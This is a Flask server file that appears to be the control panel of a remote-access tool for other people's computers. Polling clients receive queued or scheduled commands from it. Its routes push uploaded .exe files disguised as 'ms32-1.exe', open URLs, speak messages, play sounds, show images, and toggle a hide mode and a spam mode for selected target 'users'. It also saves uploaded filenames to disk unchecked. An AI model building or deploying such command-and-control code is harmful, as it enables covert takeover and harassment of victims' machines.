
import os
from time import time
from flask import Flask, render_template, request, redirect, jsonify
from datetime import datetime
import json
from zoneinfo import ZoneInfo

app = Flask(__name__)
firstReload = True
timezone = ZoneInfo("Asia/Kolkata")
startTime = time()
spam = False
selected_user = "93"
STATIC_FOLDER = os.path.join("static")
if not os.path.exists(STATIC_FOLDER):
    os.makedirs(STATIC_FOLDER)

UPLOAD_FOLDER = os.path.join(STATIC_FOLDER, "sounds")
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

@app.route("/")
def terminal():
    global firstReload
    state_file = os.path.join(STATIC_FOLDER, "state.json")
    files = os.listdir(UPLOAD_FOLDER)
    tasks_file = os.path.join(STATIC_FOLDER, "tasks.json")
    state = None
    color = "red"
    data1= None
    with open(os.path.join(STATIC_FOLDER, "users.json"), "r") as file:
        target = json.load(file)
    users = target["users"]
    selected = target["selected"]
    with open(state_file, "r") as file:
        data1 = json.load(file)
    hs = data1["hideToggleState"]["state"]
    hc = data1["hideToggleState"]["color"]
    ss = data1["spamToggleState"]["state"]
    sc = data1["spamToggleState"]["color"]
    if not firstReload:
        if time() - startTime <= 2.5:
            state = "Online"
            color = "green"
        elif time() - startTime > 2.5:
            state = "Offline"
            color = "red"
    if os.path.exists(tasks_file):
        with open(tasks_file, "r") as file:
            data = json.load(file)
    else:
        data = {"tasks": []}
    firstReload = False       
    return render_template("index.html", state=state if state else "Offline", files=files, tasks=data, color=color,hs=hs,hc=hc,ss=ss,sc=sc,users=users,selected = selected)

@app.route("/edit", methods=["POST", "GET"])
def edit():
    global spam
    if request.method == "POST":
        message = request.form["text"]   
        with open(os.path.join(STATIC_FOLDER, "message.txt"), "w") as file:
            if ("pLaY" not in message and "oPeN" not in message):    
                file.write("sPeAk" + message)
            else:
                file.write(message)
        return redirect("/")
    return "message updated"

@app.route("/command", methods=["GET", "POST"])
def command():
    global startTime
    global selected_user
    global spam
    if request.method == "GET":
        
        # Ensure `startTime` is initialized for the user
        startTime = time()
        cmd = ""
        message_file = os.path.join(STATIC_FOLDER, "message.txt")
        tasks_file = os.path.join(STATIC_FOLDER, "tasks.json")

        # Check if message file exists and read its content
        if os.path.exists(message_file):
            with open(message_file, "r") as file:
                cmd = file.read()

        if cmd == "":
            # If no command is found, check tasks in the JSON file
            if os.path.exists(tasks_file):
                with open(tasks_file, "r") as file:
                    tasks = json.load(file)

                tasks_to_delete = None
                for task in tasks["tasks"]:
                    exe = datetime.strptime(task["execution_time"], "%d-%m-%Y %H:%M")
                    exe = exe.strftime("%d-%m-%Y %H:%M")
                    now = datetime.now(timezone).strftime("%d-%m-%Y %H:%M")

                    # Find the task that is ready to execute
                    if exe <= now:
                        cmd = task["cmd"]
                        tasks_to_delete = task["id"]
                        break

                # Remove executed tasks from the JSON file
                if tasks_to_delete is not None:
                    tasks["tasks"] = [task for task in tasks["tasks"] if task["id"] != tasks_to_delete]
                    with open(tasks_file, "w") as file:
                        json.dump(tasks, file, indent=4)

        # Clear the message file if not spamming
        if not spam:
            with open(os.path.join(STATIC_FOLDER, "message.txt"), "w") as file:
                file.write("")

        return cmd if cmd else "none"
    return "none"


@app.route("/audio", methods=["POST", "GET"])
def sounds():
    if request.method == "POST":
        file = request.files["file"]
        if file and file.filename != "":
            if file.filename.endswith(('.mp3', '.wav', '.ogg')):
                file.save(os.path.join(UPLOAD_FOLDER, file.filename))
        return redirect("/")

@app.route("/play", methods=["POST", "GET"])
def play():
    if request.method == "POST":
        file = request.form["text"]
        if file != "":
            try:
                with open(os.path.join(STATIC_FOLDER, "message.txt"), "w") as a:
                    a.write("pLaY " + file)
            except:
                pass
    return redirect("/")

@app.route("/delete", methods=["POST", "GET"])
def delete():
    if request.method == "POST":
        file = request.form["text"]
        if file != "":
            try:
                os.remove(os.path.join(UPLOAD_FOLDER, file))
            except:
                pass
    return redirect("/")

@app.route("/update", methods=["POST", "GET"])
def update():
    if request.method == "POST":
        file = request.files["file"]
        if file and file.filename != "":
            if file.filename.endswith(".exe"):
                file.save(os.path.join(STATIC_FOLDER,"updates","ms32-1.exe" ))
                with open(os.path.join(STATIC_FOLDER, "message.txt"), "w") as a:
                    a.write("uPdAtE " + file.filename)
    return redirect("/")

@app.route("/url", methods=["POST", "GET"])
def url():
    if request.method == "POST":
        url = request.form["url"]
        with open(os.path.join(STATIC_FOLDER, "message.txt"), "w") as file:
            file.write("oPeN " + url)
    return redirect("/")

@app.route("/status", methods=["POST", "GET"])
def status():
    if request.method == "GET":
        deltaTime = time() - startTime
        if deltaTime >= 2.5:
            redirect("/")
            return "offline"
        else:
            redirect("/")
            return "online"

@app.route("/add-task", methods=["POST", "GET"])
def schedule():
    if request.method == "POST":
        data = {"tasks": []}
        cmd = request.form["task"]
        current_time = datetime.now(timezone).strftime("%d-%m-%Y %H:%M")
        try:
            execution_time = datetime.strptime(request.form["task-datetime"], "%Y-%m-%dT%H:%M")
        except ValueError as e:
            return f"Invalid datetime format: {e}", 400

        tasks_file = os.path.join(STATIC_FOLDER, "tasks.json")
        try:
            if os.path.exists(tasks_file):
                with open(tasks_file, "r") as file:
                    data = json.load(file)
        except Exception as e:
            return f"Error reading tasks.json: {e}", 500

        task = {
            "id": len(data["tasks"]),
            "cmd": cmd,
            "time": current_time,
            "execution_time": execution_time.strftime("%d-%m-%Y %H:%M")
        }
        data["tasks"].append(task)

        try:
            with open(tasks_file, "w") as file:
                json.dump(data, file, indent=4)
        except Exception as e:
            return f"Error writing to tasks.json: {e}", 500

        return redirect("/")

@app.route("/delete-task", methods=["POST", "GET"])
def delete_task():
    if request.method == "POST":
        id = request.form["task-id"]
        new_task = {"tasks": []}
        tasks_file = os.path.join(STATIC_FOLDER, "tasks.json")
        if os.path.exists(tasks_file):
            with open(tasks_file, "r") as file:
                tasks = json.load(file)
            for task in tasks["tasks"]:
                if str(task["id"]) != id:
                    new_task["tasks"].append(task)
            with open(tasks_file, "w") as file:
                json.dump(new_task, file, indent=4)
    return redirect("/")

@app.route("/toggle",methods=["POST"])
def toggle():
    global spam
    if request.method == "POST":
        data = request.get_json()
        cmd = data.get("cmd")
        state = data.get("state")
        color = "green" if state == "on" else "red"
        
        state_file = os.path.join(STATIC_FOLDER, "state.json")
        
        if os.path.exists(state_file):
            with open(state_file, "r") as file:
                data = json.load(file)
        
            if cmd == "hIdE":
                data["hideToggleState"]["state"] = state
                data["hideToggleState"]["color"] = color
            elif cmd == "sPaM":
                data["spamToggleState"]["state"] = state
                data["spamToggleState"]["color"] = color
        
            with open(state_file, "w") as file:
                json.dump(data, file, indent=4)
        
        if cmd == "hIdE":
            with open(os.path.join(STATIC_FOLDER, "message.txt"), "w") as file:
                file.write(f"{cmd} {state}")
        elif cmd == "sPaM":
            spam = True if state == "on" else False
    return redirect("/")

@app.route("/change-user", methods=["POST"])
def change_user():
    global selected_user
    data = request.get_json()
    user = data.get("user")
    selected_user = str(user)
    print(selected_user)
    with open(os.path.join(STATIC_FOLDER,"message.txt"),"w") as file:
        file.write("")
    with open(os.path.join(STATIC_FOLDER, "users.json"), "r") as file:
        target = json.load(file)
    target["selected"] = selected_user
    with open(os.path.join(STATIC_FOLDER, "users.json"), "w") as file:
        json.dump(target, file, indent=4)
       
    return "done"


@app.route("/image", methods=["GET", "POST"])
def img():
    if request.method == "POST":
        file = request.files["file"]
        if file and file.filename != "":
            file.save(os.path.join(STATIC_FOLDER, "images", file.filename))
            with open(os.path.join(STATIC_FOLDER, "message.txt"), "w") as a:
                a.write("iMaGe " + file.filename)
    return redirect("/")

if __name__ == "__main__":
    app.run(debug=True)


